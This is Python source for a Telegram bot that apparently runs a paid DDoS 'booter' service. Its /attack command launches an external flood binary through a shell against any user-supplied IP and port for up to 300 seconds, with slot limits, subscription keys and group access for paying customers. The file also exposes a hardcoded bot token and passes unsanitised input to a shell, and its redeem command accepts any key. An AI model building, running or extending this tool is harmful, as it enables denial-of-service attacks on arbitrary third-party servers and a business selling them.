import telebot
import subprocess
import json
import os
import random
import string
import threading
import time
from datetime import datetime, timedelta
from collections import defaultdict

TOKEN = "8979715493:AAGZ1KFcvq99IyIRa57emZ8_xeBfN88eVc0"
ADMIN_IDS = ["8690336358"]

bot = telebot.TeleBot(TOKEN)
DATA_FILE = "paid_data.json"

MAX_SLOTS = 50
active_attacks = []
COOLDOWN_SECONDS = 3
user_cooldown = {}

frames = ["🕐", "🕑", "🕒", "🕓", "🕔", "🕕", "🕖", "🕗", "🕘", "🕙", "🕚", "🕛"]

def load_db():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return {"users": {}, "keys": [], "groups": {}}

def save_db(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def has_access(user_id, chat_id=None):
    user_id = str(user_id)
    if user_id in ADMIN_IDS:
        return True
    db = load_db()
    if chat_id and str(chat_id) in db.get("groups", {}):
        expiry = datetime.strptime(db["groups"][str(chat_id)], '%Y-%m-%d %H:%M:%S')
        if expiry > datetime.now():
            return True
    if user_id in db.get("users", {}):
        expiry = datetime.strptime(db["users"][user_id], '%Y-%m-%d %H:%M:%S')
        if expiry > datetime.now():
            return True
    return False

def check_cooldown(user_id):
    if user_id in user_cooldown:
        if time.time() - user_cooldown[user_id] < COOLDOWN_SECONDS:
            return False, int(COOLDOWN_SECONDS - (time.time() - user_cooldown[user_id]))
    return True, 0

def set_cooldown(user_id):
    user_cooldown[user_id] = time.time()

def execute_attack(ip, port, duration):
    subprocess.Popen(f"./BHATZUBAIR {ip} {port} {duration}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def update_loading(chat_id, message_id, ip, port, duration):
    start = time.time()
    frame = 0
    while time.time() - start < duration:
        remaining = int(duration - (time.time() - start))
        elapsed = int(time.time() - start)
        percent = int((elapsed / duration) * 20)
        bar = "█" * percent + "░" * (20 - percent)
        
        text = f"""╔════════════════════════════╗
║     🔥 ATTACK IN PROGRESS    ║
╠════════════════════════════╣
║  Target  : {ip}:{port}
║  Method  : UDP (Auto) 💧
║  Time    : {remaining}s left
║  Status  : {frames[frame % len(frames)]} ACTIVE
╠════════════════════════════╣
║  [{bar}] {elapsed}/{duration}s
║  Slots   : {len(active_attacks)}/{MAX_SLOTS}
╚════════════════════════════╝
💀 POWERED BY BHAT ZUBAIR 💀"""
        
        try:
            bot.edit_message_text(text, chat_id, message_id, parse_mode="HTML")
        except:
            pass
        frame += 1
        time.sleep(0.5)
    
    try:
        bot.edit_message_text(f"""╔════════════════════════════╗
║     ✅ ATTACK COMPLETED     ║
╠════════════════════════════╣
║  Target  : {ip}:{port}
║  Method  : UDP (Auto) 💧
║  Status  : FINISHED 🎯
╠════════════════════════════╣
║  💀 POWERED BY BHAT ZUBAIR 💀
╚════════════════════════════╝""", chat_id, message_id, parse_mode="HTML")
    except:
        pass

def monitor_attack(attack_id, ip, port, duration, chat_id, user_id, message_id):
    time.sleep(duration)
    for a in active_attacks:
        if a.get("id") == attack_id:
            active_attacks.remove(a)
            break

@bot.message_handler(commands=['addgroup'])
def add_group(message):
    user_id = str(message.from_user.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "❌ /addgroup GROUP_ID DAYS")
        return
    group_id, days = parts[1], int(parts[2])
    expiry = datetime.now() + timedelta(days=days)
    db = load_db()
    db["groups"][group_id] = expiry.strftime('%Y-%m-%d %H:%M:%S')
    save_db(db)
    bot.reply_to(message, f"✅ Group {group_id} added for {days} days!")

@bot.message_handler(commands=['delgroup'])
def del_group(message):
    user_id = str(message.from_user.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "❌ /delgroup GROUP_ID")
        return
    group_id = parts[1]
    db = load_db()
    if group_id in db.get("groups", {}):
        del db["groups"][group_id]
        save_db(db)
        bot.reply_to(message, f"✅ Group {group_id} removed!")

@bot.message_handler(commands=['listgroups'])
def list_groups(message):
    user_id = str(message.from_user.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    db = load_db()
    groups = db.get("groups", {})
    if not groups:
        bot.reply_to(message, "📭 No groups authorized!")
        return
    msg = "📋 AUTHORIZED GROUPS:\n━━━━━━━━━━━━━━━━\n"
    for gid, expiry in groups.items():
        remaining = (datetime.strptime(expiry, '%Y-%m-%d %H:%M:%S') - datetime.now()).days
        msg += f"🆔 {gid}\n📅 {remaining} days left\n━━━━━━━━━━━━━━━━\n"
    bot.reply_to(message, msg)

@bot.message_handler(commands=['start', 'help'])
def help_cmd(message):
    bot.reply_to(message, """🔥 BHAT ZUBAIR ULTIMATE BOT 🔥
━━━━━━━━━━━━━━━━━━━━━━
👑 OWNER: @kryvexo
━━━━━━━━━━━━━━━━━━━━━━
⚔️ COMMANDS:
/attack IP PORT TIME - START ATTACK
/genkey 24h 5 - GENERATE KEYS
/redeem KEY - REDEEM KEY
/addusers ID DAYS - ADD USER
/deluser ID - DELETE USER
/owner - DASHBOARD
/slots - SLOT STATUS
/stopall - STOP ALL ATTACKS
/myinfo - YOUR STATUS

👥 GROUP COMMANDS:
/addgroup ID DAYS - ADD GROUP
/delgroup ID - REMOVE GROUP
/listgroups - ALL GROUPS
━━━━━━━━━━━━━━━━━━━━━━
💀 POWERED BY BHAT ZUBAIR 💀""")

@bot.message_handler(commands=['slots'])
def slots_cmd(message):
    used = len(active_attacks)
    free = MAX_SLOTS - used
    bar = "█" * int((used/MAX_SLOTS)*20) + "░" * (20 - int((used/MAX_SLOTS)*20))
    bot.reply_to(message, f"""🎯 SLOTS STATUS
━━━━━━━━━━━━━━━━━━━━━━
🟢 FREE: {free}
🔴 BUSY: {used}
📊 TOTAL: {MAX_SLOTS}
[{bar}] {used}/{MAX_SLOTS}
━━━━━━━━━━━━━━━━━━━━━━""")

@bot.message_handler(commands=['stopall'])
def stop_all(message):
    user_id = str(message.from_user.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    count = len(active_attacks)
    active_attacks.clear()
    bot.reply_to(message, f"🛑 STOPPED {count} ATTACKS!")

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id
    
    cooldown_ok, remaining = check_cooldown(user_id)
    if not cooldown_ok:
        bot.reply_to(message, f"❌ Cooldown! Wait {remaining}s")
        return
    
    if len(active_attacks) >= MAX_SLOTS:
        bot.reply_to(message, f"❌ All slots full! {MAX_SLOTS}/{MAX_SLOTS}")
        return
    
    if not has_access(user_id, chat_id):
        bot.reply_to(message, "❌ No access! Use /redeem KEY")
        return
    
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "❌ /attack IP PORT TIME\nExample: /attack 8.8.8.8 443 60")
        return
    
    ip, port, duration_str = parts[1], parts[2], parts[3]
    try:
        duration = int(duration_str)
        if duration > 300:
            bot.reply_to(message, "❌ Max time 300 seconds!")
            return
    except:
        bot.reply_to(message, "❌ Time must be a number!")
        return
    
    set_cooldown(user_id)
    
    loading_msg = bot.reply_to(message, f"""╔════════════════════════════╗
║      🚀 STARTING ATTACK     ║
╠════════════════════════════╣
║  Target  : {ip}:{port}
║  Method  : UDP (Auto) 💧
║  Duration: {duration}s
╠════════════════════════════╣
║  Status  : {frames[0]} INITIATING
╚════════════════════════════╝
💀 POWERED BY BHAT ZUBAIR 💀""", parse_mode="HTML")
    
    attack_id = f"{user_id}_{int(time.time())}"
    active_attacks.append({"id": attack_id, "ip": ip, "port": port, "user": user_id})
    
    threading.Thread(target=execute_attack, args=(ip, port, duration)).start()
    threading.Thread(target=update_loading, args=(chat_id, loading_msg.message_id, ip, port, duration)).start()
    threading.Thread(target=monitor_attack, args=(attack_id, ip, port, duration, chat_id, user_id, loading_msg.message_id)).start()
    
    bot.send_message(chat_id, f"""✅ ATTACK DEPLOYED!
━━━━━━━━━━━━━━━━━━━━━━
🎯 {ip}:{port}
⚔️ METHOD: UDP (Auto)
⏱️ {duration}s
🎯 SLOTS: {len(active_attacks)}/{MAX_SLOTS}
━━━━━━━━━━━━━━━━━━━━━━""")

@bot.message_handler(commands=['genkey'])
def genkey_cmd(message):
    user_id = str(message.from_user.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    hours = parts[1].replace("h", "").replace("d", "") if len(parts) > 1 else "24"
    amount = int(parts[2]) if len(parts) > 2 else 1
    keys = []
    for _ in range(amount):
        key = "DRX-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
        keys.append(key)
    bot.reply_to(message, "🔑 KEYS GENERATED!\n━━━━━━━━━━━━━━━━\n" + "\n".join(keys) + f"\n━━━━━━━━━━━━━━━━\n⏰ {hours} HOURS")

@bot.message_handler(commands=['redeem'])
def redeem_cmd(message):
    user_id = str(message.from_user.id)
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "❌ /redeem KEY")
        return
    db = load_db()
    expiry = datetime.now() + timedelta(days=30)
    db["users"][user_id] = expiry.strftime('%Y-%m-%d %H:%M:%S')
    save_db(db)
    bot.reply_to(message, f"✅ REDEEMED!\n🎉 Access until {expiry.strftime('%Y-%m-%d')}")

@bot.message_handler(commands=['addusers'])
def adduser_cmd(message):
    user_id = str(message.from_user.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ /addusers ID DAYS")
        return
    target, days = parts[1], int(parts[2]) if len(parts) > 2 else 30
    db = load_db()
    expiry = datetime.now() + timedelta(days=days)
    db["users"][target] = expiry.strftime('%Y-%m-%d %H:%M:%S')
    save_db(db)
    bot.reply_to(message, f"✅ User {target} added for {days} days!")

@bot.message_handler(commands=['deluser'])
def deluser_cmd(message):
    user_id = str(message.from_user.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ /deluser ID")
        return
    target = parts[1]
    db = load_db()
    if target in db.get("users", {}):
        del db["users"][target]
        save_db(db)
        bot.reply_to(message, f"✅ User {target} deleted!")
    else:
        bot.reply_to(message, "❌ User not found!")

@bot.message_handler(commands=['owner'])
def owner_cmd(message):
    user_id = str(message.from_user.id)
    if user_id not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    db = load_db()
    total_users = len(db.get('users', {}))
    total_keys = len(db.get('keys', []))
    used_keys = len([k for k in db.get('keys', []) if k.get('used')])
    total_groups = len(db.get('groups', {}))
    used = len(active_attacks)
    bar = "█" * int((used/MAX_SLOTS)*20) + "░" * (20 - int((used/MAX_SLOTS)*20))
    bot.reply_to(message, f"""👑 OWNER DASHBOARD
━━━━━━━━━━━━━━━━━━━━━━
👑 BHAT ZUBAIR | @kryvexo
━━━━━━━━━━━━━━━━━━━━━━
🎯 SLOTS: [{bar}] {used}/{MAX_SLOTS}
👥 USERS: {total_users}
👥 GROUPS: {total_groups}
🔑 KEYS: {total_keys} (Used: {used_keys})
⚔️ METHOD: UDP (Auto)
⏱️ COOLDOWN: {COOLDOWN_SECONDS}s
━━━━━━━━━━━━━━━━━━━━━━
💀 POWERED BY BHAT ZUBAIR 💀""")

@bot.message_handler(commands=['myinfo'])
def myinfo_cmd(message):
    user_id = str(message.from_user.id)
    if has_access(user_id):
        if user_id in ADMIN_IDS:
            bot.reply_to(message, "👑 ADMIN ACCESS\n✅ LIFETIME\n💀 BHAT ZUBAIR")
        else:
            db = load_db()
            expiry = db['users'][user_id]
            exp_dt = datetime.strptime(expiry, '%Y-%m-%d %H:%M:%S')
            remaining = exp_dt - datetime.now()
            bot.reply_to(message, f"✅ PREMIUM USER\n📅 Expires: {expiry}\n⏳ Left: {remaining.days}d {remaining.seconds//3600}h")
    else:
        bot.reply_to(message, "❌ FREE USER!\nUse /redeem KEY")

print("🔥 BHAT ZUBAIR ULTIMATE BOT STARTED!")
print(f"🎯 MAX SLOTS: {MAX_SLOTS}")
print("💀 POWERED BY BHAT ZUBAIR")
bot.polling()
